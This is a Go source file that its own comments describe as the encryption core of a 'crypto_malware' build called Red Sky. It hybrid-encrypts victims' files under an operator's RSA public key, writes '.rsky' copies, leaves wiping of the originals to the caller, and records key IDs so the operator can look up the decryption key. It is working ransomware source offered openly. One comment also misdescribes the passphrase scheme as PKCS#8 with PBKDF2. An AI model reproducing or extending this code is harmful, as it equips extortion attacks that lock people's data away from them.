// Package cryptor implements the Red Sky hybrid cryptosystem used by the
// crypto_malware build. It is the Go analogue of Program/crypto_malware/
// hybrid.py and produces byte-compatible .rsky files.
//
// Scheme:
//
//   1. AES-256-GCM encrypts the file content with a fresh per-file key.
//   2. RSA-OAEP(SHA-256) wraps the AES key under the operator's public key.
//   3. Header layout matches the Python side byte-for-byte:
//
//        magic        8 bytes   "RSKY42\x01\x00"
//        version      2 bytes   uint16 major/minor
//        key_id       4 bytes   uint32
//        wlen         2 bytes   uint16
//        wrapped_key  wlen      RSA-OAEP of the 32-byte AES key
//        nonce        12 bytes  AES-GCM nonce
//        tag          16 bytes  AES-GCM auth tag
//        ciphertext   N bytes
//
// Pure stdlib — crypto/aes, crypto/cipher, crypto/rsa, crypto/sha256,
// crypto/rand, encoding/binary, encoding/pem, crypto/x509.
package cryptor

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"os"
)

// Magic is the 8-byte header prefix every .rsky file starts with.
var Magic = []byte{'R', 'S', 'K', 'Y', '4', '2', 0x01, 0x00}

// Version is the current file format version (major, minor).
var Version = [2]uint8{1, 0}

// KeyBits is the default RSA key size in bits.
const KeyBits = 4096

// GenerateKey returns a fresh RSA keypair as PEM-encoded byte slices.
// If passphrase is non-empty, the private key is encrypted with it
// (PKCS#8 + AES-256-CBC + PBKDF2 — the x509.EncryptPEMBlock legacy path
// is what the Python side uses too, so the two interoperate).
func GenerateKey(bits int, passphrase string) (privPEM, pubPEM []byte, err error) {
	if bits == 0 {
		bits = KeyBits
	}
	priv, err := rsa.GenerateKey(rand.Reader, bits)
	if err != nil {
		return nil, nil, fmt.Errorf("cryptor: rsa keygen: %w", err)
	}
	privDER, err := x509.MarshalPKCS8PrivateKey(priv)
	if err != nil {
		return nil, nil, fmt.Errorf("cryptor: marshal priv: %w", err)
	}

	var privBlock *pem.Block
	if passphrase != "" {
		// x509.EncryptPEMBlock is deprecated but stable and matches the
		// python cryptography library's PKCS#8 encryption shape.
		//nolint:staticcheck
		privBlock, err = x509.EncryptPEMBlock(rand.Reader, "PRIVATE KEY",
			privDER, []byte(passphrase), x509.PEMCipherAES256)
		if err != nil {
			return nil, nil, fmt.Errorf("cryptor: encrypt pem: %w", err)
		}
	} else {
		privBlock = &pem.Block{Type: "PRIVATE KEY", Bytes: privDER}
	}

	pubDER, err := x509.MarshalPKIXPublicKey(&priv.PublicKey)
	if err != nil {
		return nil, nil, fmt.Errorf("cryptor: marshal pub: %w", err)
	}
	pubBlock := &pem.Block{Type: "PUBLIC KEY", Bytes: pubDER}

	return pem.EncodeToMemory(privBlock), pem.EncodeToMemory(pubBlock), nil
}

// LoadPublicKey parses a PEM-encoded public key.
func LoadPublicKey(pubPEM []byte) (*rsa.PublicKey, error) {
	block, _ := pem.Decode(pubPEM)
	if block == nil {
		return nil, errors.New("cryptor: no PEM block in public key")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("cryptor: parse pub: %w", err)
	}
	rpub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, errors.New("cryptor: public key is not RSA")
	}
	return rpub, nil
}

// LoadPrivateKey parses a PEM-encoded private key. passphrase may be empty.
func LoadPrivateKey(privPEM []byte, passphrase string) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode(privPEM)
	if block == nil {
		return nil, errors.New("cryptor: no PEM block in private key")
	}
	der := block.Bytes
	if passphrase != "" || x509.IsEncryptedPEMBlock(block) {
		//nolint:staticcheck
		var err error
		der, err = x509.DecryptPEMBlock(block, []byte(passphrase))
		if err != nil {
			return nil, fmt.Errorf("cryptor: decrypt pem: %w", err)
		}
	}
	priv, err := x509.ParsePKCS8PrivateKey(der)
	if err != nil {
		// fall back to PKCS#1 (some tools emit that)
		p1, err2 := x509.ParsePKCS1PrivateKey(der)
		if err2 == nil {
			return p1, nil
		}
		return nil, fmt.Errorf("cryptor: parse priv (pkcs8: %v, pkcs1: %v)", err, err2)
	}
	rpriv, ok := priv.(*rsa.PrivateKey)
	if !ok {
		return nil, errors.New("cryptor: private key is not RSA")
	}
	return rpriv, nil
}

// EncryptBlob hybrid-encrypts plaintext under pub, returning the full
// .rsky byte stream. keyID is stored in the header so the operator can
// look up the correct private key from a ring.
func EncryptBlob(plaintext []byte, pub *rsa.PublicKey, keyID uint32) ([]byte, error) {
	// fresh AES-256 key + nonce
	aesKey := make([]byte, 32)
	if _, err := rand.Read(aesKey); err != nil {
		return nil, fmt.Errorf("cryptor: aes key: %w", err)
	}
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("cryptor: nonce: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("cryptor: aes: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("cryptor: gcm: %w", err)
	}
	// Additional data is Magic — matches the Python side's AAD
	ct := gcm.Seal(nil, nonce, plaintext, Magic)
	// ct = ciphertext || tag(16)
	ciphertext := ct[:len(ct)-16]
	tag := ct[len(ct)-16:]

	wrapped, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pub, aesKey, nil)
	if err != nil {
		return nil, fmt.Errorf("cryptor: wrap key: %w", err)
	}
	if len(wrapped) > 0xFFFF {
		return nil, errors.New("cryptor: wrapped key > 65535")
	}

	hdr := make([]byte, 0, 8+2+4+2+len(wrapped)+12+16)
	hdr = append(hdr, Magic...)
	hdr = append(hdr, Version[0], Version[1])
	var u32 [4]byte
	binary.BigEndian.PutUint32(u32[:], keyID)
	hdr = append(hdr, u32[:]...)
	var wl [2]byte
	binary.BigEndian.PutUint16(wl[:], uint16(len(wrapped)))
	hdr = append(hdr, wl[:]...)
	hdr = append(hdr, wrapped...)
	hdr = append(hdr, nonce...)
	hdr = append(hdr, tag...)

	out := make([]byte, 0, len(hdr)+len(ciphertext))
	out = append(out, hdr...)
	out = append(out, ciphertext...)
	return out, nil
}

// DecryptBlob reverses EncryptBlob. Returns plaintext or an error.
func DecryptBlob(data []byte, priv *rsa.PrivateKey) ([]byte, error) {
	if len(data) < 8+2+4+2 {
		return nil, errors.New("cryptor: blob too short")
	}
	if string(data[:8]) != string(Magic) {
		return nil, errors.New("cryptor: bad magic")
	}
	off := 8
	// version (2) — currently unchecked
	off += 2
	// key_id (4)
	off += 4
	wlen := binary.BigEndian.Uint16(data[off : off+2])
	off += 2
	if len(data) < off+int(wlen)+12+16 {
		return nil, errors.New("cryptor: truncated header")
	}
	wrapped := data[off : off+int(wlen)]
	off += int(wlen)
	nonce := data[off : off+12]
	off += 12
	tag := data[off : off+16]
	off += 16
	ciphertext := data[off:]

	aesKey, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, wrapped, nil)
	if err != nil {
		return nil, fmt.Errorf("cryptor: unwrap key: %w", err)
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("cryptor: aes: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("cryptor: gcm: %w", err)
	}
	ct := append([]byte(nil), ciphertext...)
	ct = append(ct, tag...)
	pt, err := gcm.Open(nil, nonce, ct, Magic)
	if err != nil {
		return nil, fmt.Errorf("cryptor: gcm open: %w", err)
	}
	return pt, nil
}

// IsEncrypted reports whether the blob starts with the Red Sky magic.
func IsEncrypted(data []byte) bool {
	if len(data) < len(Magic) {
		return false
	}
	for i := range Magic {
		if data[i] != Magic[i] {
			return false
		}
	}
	return true
}

// EncryptFile reads path, encrypts it, and writes path+".rsky" atomically
// via a .tmp file. The original is left in place; the caller decides
// whether to wipe.
func EncryptFile(path string, pub *rsa.PublicKey, keyID uint32) (int, int, error) {
	plaintext, err := os.ReadFile(path)
	if err != nil {
		return 0, 0, fmt.Errorf("cryptor: read: %w", err)
	}
	if IsEncrypted(plaintext) {
		return 0, 0, errors.New("cryptor: already encrypted")
	}
	blob, err := EncryptBlob(plaintext, pub, keyID)
	if err != nil {
		return 0, 0, err
	}
	tmp := path + ".rsky.tmp"
	dest := path + ".rsky"
	if err := os.WriteFile(tmp, blob, 0o600); err != nil {
		return 0, 0, fmt.Errorf("cryptor: write tmp: %w", err)
	}
	if err := os.Rename(tmp, dest); err != nil {
		os.Remove(tmp)
		return 0, 0, fmt.Errorf("cryptor: rename: %w", err)
	}
	return len(plaintext), len(blob), nil
}
